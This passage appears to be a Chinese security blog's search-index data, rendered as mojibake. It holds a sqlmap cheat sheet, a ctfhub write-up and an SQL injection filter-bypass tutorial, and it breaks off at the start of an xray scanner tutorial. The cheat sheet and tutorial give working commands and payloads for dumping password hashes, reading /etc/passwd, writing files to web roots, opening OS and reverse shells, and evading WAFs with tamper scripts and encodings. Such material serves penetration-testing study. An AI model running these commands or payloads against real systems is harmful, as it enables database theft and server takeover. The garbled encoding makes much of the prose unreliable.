#æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. --threads ã€€ã€€  #é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) --sql-shell    #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ --sql-query    #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) --file-read    #è¯»å–æŒ‡å®šæ–‡ä»¶ --file-write   #å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) --file-dest    #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ --os-cmd=id    #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ --os-shell     #ç³»ç»Ÿäº¤äº’shell --os-pwn       #åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) --msf-path=    #matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) --os-smbrelay  # --os-bof       # --reg-read     #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ --priv-esc     # --time-sec=    #å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #æŒ‡å®šuser-agentæ³¨å…¥ --eta          #ç›²æ³¨ /pentest/database/sqlmap/txt/common-columns.txtã€€ã€€å­—æ®µå­—å…¸ã€€ã€€ã€€ common-outputs.txt common-tables.txt      è¡¨å­—å…¸ keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt å¸¸ç”¨è¯­å¥ :1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\\boot.ini&quot; -v 2 7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;ç®€å•çš„æ³¨å…¥æµç¨‹ :1.è¯»å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 2.åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U ç”¨æˆ·å -v 1 sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U ç”¨æˆ·å -v 1 3.è¯»å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·æˆ–æŒ‡å®šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç  sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 4.è·å–æ‰€æœ‰æ•°æ®åº“ sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 5.è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 6.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨çš„å­—æ®µ sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 7.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µçš„æ•°æ® sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 8.file-readè¯»å–webæ–‡ä»¶ sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 9.file-writeå†™å…¥æ–‡ä»¶åˆ°web sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --fileä½¿ç”¨sqlmapç»•è¿‡é˜²ç«å¢™è¿›è¡Œæ³¨å…¥æµ‹è¯•\n\nsqlmap å¸¸ç”¨ç»•è¿‡è„šæœ¬ä½¿ç”¨æ–¹æ³• --tamper xxx.py\napostrophemask.py                         ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦apostrophenullencode.py                   ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦appendnullbyte.py                         åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç base64encode.py                           å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç between.py                                åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND #â€æ›¿æ¢å¤§äºå·â€œ&gt;â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ=â€bluecoat.py              åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ=â€chardoubleencode.py      å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰charencode.py            å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰charunicodeencode.py     å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode ç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰concat2concatws.py  ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A,B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹equaltolike.py          ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ=â€greatest.py             ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ&gt;â€halfversionedmorekeywords.py         åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Šifnull2ifisnull.py                   ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹lowercase.py                         ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦modsecurityversioned.py              ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢modsecurityzeroversioned.py          ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢multiplespaces.py                    åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼nonrecursivereplacement.py           ç”¨representationsæ›¿æ¢é¢„å®šä¹‰SQLå…³é”®å­—ï¼Œé€‚ç”¨äºè¿‡æ»¤å™¨overlongutf8.py                      è½¬æ¢ç»™å®šçš„payloadå½“ä¸­çš„æ‰€æœ‰å­—ç¬¦percentage.py                        åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·randomcase.py                        éšæœºè½¬æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦çš„å¤§å°å†™randomcomments.py                    å‘SQLå…³é”®å­—ä¸­æ’å…¥éšæœºæ³¨é‡Šsecuresphere.py                      æ·»åŠ ç»è¿‡ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²sp_password.pyå‘payloadæœ«å°¾æ·»åŠ â€œsp_passwordâ€ for automatic obfuscation from DBMS logsspace2comment.py                     ç”¨â€œ//â€æ›¿æ¢ç©ºæ ¼ç¬¦**space2dash.py                     ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2hash.py                     ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2morehash.py                 ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2mssqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2mssqlhash.py                ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2mysqlblank.py               ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2mysqldash.py                ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦space2plus.py                     ç”¨åŠ å·â€œ+â€æ›¿æ¢ç©ºæ ¼ç¬¦space2randomblank.py              ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦unionalltounion.py                ç”¨â€œUNION SELECTâ€æ›¿æ¢â€œUNION ALL SELECTâ€unmagicquotes.py                  ç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ç¬¦varnish.py                        æ·»åŠ ä¸€ä¸ªHTTPå¤´â€œX-originating-IPâ€æ¥ç»•è¿‡WAFversionedkeywords.py              ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªéå‡½æ•°å…³é”®å­—versionedmorekeywords.py          ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªå…³é”®å­—xforwardedfor.py                  æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„HTTPå¤´â€œX-Forwarded-Forâ€æ¥ç»•è¿‡WAF\n\n","categories":["Web"],"tags":["sqlæ³¨å…¥","sqlmap"]},{"title":"find_it","url":"/find-it/","content":"2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it\n\né¦–å…ˆè¿›é¡¹ç«¯å£æ‰«ædirsearch\n\n\n\n\nrobots.txt æ–‡ä»¶å†…å®¹\n\n\n\n1ndexx.php æ‰“å¼€404 ï¼Œå°è¯•æ‰“å¼€å¤‡ä»½æ–‡ä»¶.1ndexx.php.swp\n\n\n\næŸ¥çœ‹æºä»£ç \n\n\n\nç›´æ¥è®¿é—®hack.phpæ— æ³•è®¿é—® show_source()è¯»å–æ–‡ä»¶ï¼š\n\n?code=&lt;?php show_source(__FILE__);?&gt;\n\n\nhttp://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=&lt;?php show_source(__FILE__);?&gt;\nhttp://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php\n\n\nå…³äºshow_source()show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚æœ¬å‡½æ•°æ˜¯ highlight_file() çš„åˆ«å12\n\nå…³äº.swpç¼“å­˜æ–‡ä»¶æ–‡ä»¶æ³„éœ²(.swpå¤‡ä»½æ–‡ä»¶):éæ­£å¸¸å…³é—­vi&#x2F;vimç¼–è¾‘å™¨æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ \nè°ƒç”¨è¿™ç±»çš„éšè—æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦åœ¨æœ€å‰é¢åŠ .\n\nå®˜æ–¹WriteUpfind_it | CTFHub\n","categories":["CTF","ctfhub"],"tags":["web","å¤‡ä»½æ–‡ä»¶æ³„éœ²"]},{"title":"sqlæ³¨å…¥ç»•è¿‡æŠ€å·§","url":"/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","content":"sqlæ³¨å…¥ç»•è¿‡æŠ€å·§1.ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦&#x2F;* *&#x2F;ï¼Œ%a0ï¼‰ï¼šã€€ã€€ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼ï¼š\n%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\n\n æœ€åŸºæœ¬çš„ç»•è¿‡æ–¹æ³•ï¼Œç”¨æ³¨é‡Šæ›¿æ¢ç©ºæ ¼ï¼š\n/*  æ³¨é‡Š */\n\n\nä½¿ç”¨æµ®ç‚¹æ•°ï¼š\nselect * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3\n\n2.æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼šã€€ã€€å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ‹¬å·ç»•è¿‡ã€‚\nã€€ã€€åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚\nä¾‹å¦‚ï¼š\nselect(user())from dual where(1=1)and(2=2)\n\nã€€ã€€è¿™ç§è¿‡æ»¤æ–¹æ³•å¸¸å¸¸ç”¨äºtime basedç›²æ³¨,ä¾‹å¦‚ï¼š\n?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23\n\nï¼ˆfrom forå±äºé€—å·ç»•è¿‡ä¸‹é¢ä¼šæœ‰ï¼‰\nã€€ã€€ä¸Šé¢çš„æ–¹æ³•æ—¢æ²¡æœ‰é€—å·ä¹Ÿæ²¡æœ‰ç©ºæ ¼ã€‚çŒœè§£databaseï¼ˆï¼‰ç¬¬ä¸€ä¸ªå­—ç¬¦asciiç æ˜¯å¦ä¸º109ï¼Œè‹¥æ˜¯åˆ™åŠ è½½å»¶æ—¶ã€‚\n3.å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰ã€€ã€€ä¼šä½¿ç”¨åˆ°å¼•å·çš„åœ°æ–¹ä¸€èˆ¬æ˜¯åœ¨æœ€åçš„whereå­å¥ä¸­ã€‚å¦‚ä¸‹é¢çš„ä¸€æ¡sqlè¯­å¥ï¼Œè¿™æ¡è¯­å¥å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æ¥æŸ¥é€‰å¾—åˆ°usersè¡¨ä¸­æ‰€æœ‰å­—æ®µçš„ä¸€æ¡è¯­å¥ï¼š\nselect column_name  from information_schema.tables where table_name=&quot;users&quot;\n\nã€€ã€€è¿™ä¸ªæ—¶å€™å¦‚æœå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„whereå­å¥å°±æ— æ³•ä½¿ç”¨äº†ã€‚é‚£ä¹ˆé‡åˆ°è¿™æ ·çš„é—®é¢˜å°±è¦ä½¿ç”¨åå…­è¿›åˆ¶æ¥å¤„ç†è¿™ä¸ªé—®é¢˜äº†ã€‚ã€€ã€€usersçš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²æ˜¯7573657273ã€‚é‚£ä¹ˆæœ€åçš„sqlè¯­å¥å°±å˜ä¸ºäº†ï¼š\nselect column_name  from information_schema.tables where table_name=0x7573657273\n\n4.é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼šã€€ã€€åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨from toçš„æ–¹å¼æ¥è§£å†³ï¼š\nselect substr(database() from 1 for 1);select mid(database() from 1 for 1);\n\nã€€ã€€ä½¿ç”¨joinï¼š\nunion select 1,2     #ç­‰ä»·äºunion select * from (select 1)a join (select 2)b\n\nã€€ã€€ä½¿ç”¨likeï¼š\nselect ascii(mid(user(),1,1))=80   #ç­‰ä»·äºselect user() like &#x27;r%&#x27;\n\nã€€ã€€å¯¹äºlimitå¯ä»¥ä½¿ç”¨offsetæ¥ç»•è¿‡ï¼š\nselect * from news limit 0,1# ç­‰ä»·äºä¸‹é¢è¿™æ¡SQLè¯­å¥select * from news limit 1 offset 0\n\n5.æ¯”è¾ƒç¬¦å·ï¼ˆ&lt;&gt;ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼šä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰ã€€åŒæ ·æ˜¯åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°greatestæ¥è¿›è¡Œç»•è¿‡äº†ã€‚ã€€ã€€æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š\nselect * from users where id=1 and ascii(substr(database(),0,1))&gt;64\n\nã€€ã€€æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨greatestæ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,â€¦)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,â€¦)çš„æœ€å¤§å€¼ã€‚ã€€ã€€é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨greatestå˜ä¸ºå¦‚ä¸‹çš„å­å¥:\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\nä½¿ç”¨between andï¼š  between a and bï¼š\nbetween 1 and 1; ç­‰ä»·äº &#x3D;1\n6.or and xor notç»•è¿‡ï¼šand=&amp;&amp;  or=||   xor=|   not=!\n\n7.ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œâ€“(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼šid=1&#x27; union select 1,2,3||&#x27;1\n\nã€€ã€€æœ€åçš„or â€˜1é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼Œæˆ–è€…ï¼š\nid=1&#x27; union select 1,2,&#x27;3\n\n8.&#x3D;ç»•è¿‡ï¼šã€€ã€€ä½¿ç”¨like ã€rlike ã€regexp æˆ–è€… ä½¿ç”¨&lt; æˆ–è€… &gt;\n9.ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼šï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼šã€€ã€€å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š\n//ï¼Œ-- , /**/, #, --+, -- -, ;,%00,--a\n\nã€€ã€€ç”¨æ³•ï¼š\nU/**/ NION /**/ SE/**/ LECT /**/userï¼Œpwd from user\n\nï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼šid=-1&#x27;UnIoN/**/SeLeCT\n\nï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼šid=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n\nï¼ˆ4ï¼‰ åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼šid=-1&#x27;UNIunionONSeLselectECT1,2,3â€“-\n\n10.é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼šã€€ã€€å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ï¼š\nor 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚\n\n11.ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼šhex()ã€bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()ã€substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74ã€€æˆ–è€…ï¼šsubstr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1\n\n12.å®½å­—èŠ‚æ³¨å…¥ï¼šã€€ã€€è¿‡æ»¤ â€˜ çš„æ—¶å€™å¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º &#39; ã€‚\nã€€ã€€åœ¨ mysql ä¸­ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š\nã€€ã€€ï¼ˆ1ï¼‰%df åƒæ‰ \\ å…·ä½“çš„æ–¹æ³•æ˜¯ urlencode(â€˜) &#x3D; %5c%27ï¼Œæˆ‘ä»¬åœ¨ %5c%27 å‰é¢æ·»åŠ  %df ï¼Œå½¢æˆ %df%5c%27 ï¼Œè€Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ï¼ˆâ€™ï¼‰ç¬¦å·åœ¨å¤–é¢ï¼š\nid=-1%df%27union select 1,user(),3--+\n\nã€€ã€€ï¼ˆ2ï¼‰å°† &#39; ä¸­çš„ \\ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 ï¼Œåé¢çš„ %5c ä¼šè¢«å‰é¢çš„ %5c æ³¨é‡Šæ‰ã€‚\nä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š  1.replaceï¼ˆï¼‰ï¼šè¿‡æ»¤ â€˜ \\ ï¼Œå°† â€˜ è½¬åŒ–ä¸º &#39; ï¼Œå°† \\  è½¬ä¸º \\ï¼Œå°† â€œ è½¬ä¸º &quot; ã€‚ç”¨æ€è·¯ä¸€ã€‚\n  2.addslaches()ï¼šè¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ ï¼ˆ\\ï¼‰çš„å­—ç¬¦ä¸²ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼šâ€™ , â€œ , \\ ã€‚ç”¨æ€è·¯ä¸€\nï¼ˆé˜²å¾¡æ­¤æ¼æ´ï¼Œè¦å°† mysql_query è®¾ç½®ä¸º binary çš„æ–¹å¼ï¼‰\nã€€ ã€€3.mysql_real_escape_string()ï¼šè½¬ä¹‰ä¸‹åˆ—å­—ç¬¦ï¼š\n\\x00     \\n     \\r     \\     &#x27;     &quot;     \\x1a\n\nï¼ˆé˜²å¾¡ï¼Œå°†mysqlè®¾ç½®ä¸ºgbkå³å¯ï¼‰\nPCREç»•è¿‡ï¼šunion/*&#x27;+&#x27;a&#x27;*1000001+&#x27;*/select\n\n","categories":["Web"],"tags":["sqlæ³¨å…¥","ç»•è¿‡"]},{"title":"xray-webscanä½¿ç”¨æ•™ç¨‹","url":"/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","content":"xray-webscanå¿«é€Ÿä½¿ç”¨æ‰«æä¸€ä¸ªç«™ç‚¹æœ€ç®€å•çš„æ–¹å¼æ˜¯ç›´æ¥è°ƒç”¨ï¼Œæ‰«æä¸€ä¸ªæŒ‡å®šçš„ç«™ç‚¹ï¼Œå¦‚ï¼š\n./xray webscan --basic-crawler 